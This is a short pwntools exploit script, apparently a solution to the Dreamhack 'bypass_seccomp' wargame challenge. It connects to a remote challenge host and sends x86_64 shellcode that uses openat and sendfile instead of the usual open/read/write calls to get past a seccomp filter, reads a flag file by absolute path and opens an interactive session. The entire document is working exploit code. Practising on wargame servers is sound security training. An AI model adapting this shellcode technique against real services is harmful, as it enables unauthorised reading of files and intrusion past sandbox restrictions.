from pwn import *

port = 18372
rem = remote("host3.dreamhack.games", port)

context.arch = 'x86_64'
shellcode = shellcraft.openat(0, "/home/bypass_seccomp/flag")
shellcode += shellcraft.sendfile(1, 'rax', 0, 0xff)
shellcode += shellcraft.exit(0)

rem.sendline(asm(shellcode))

rem.interactive()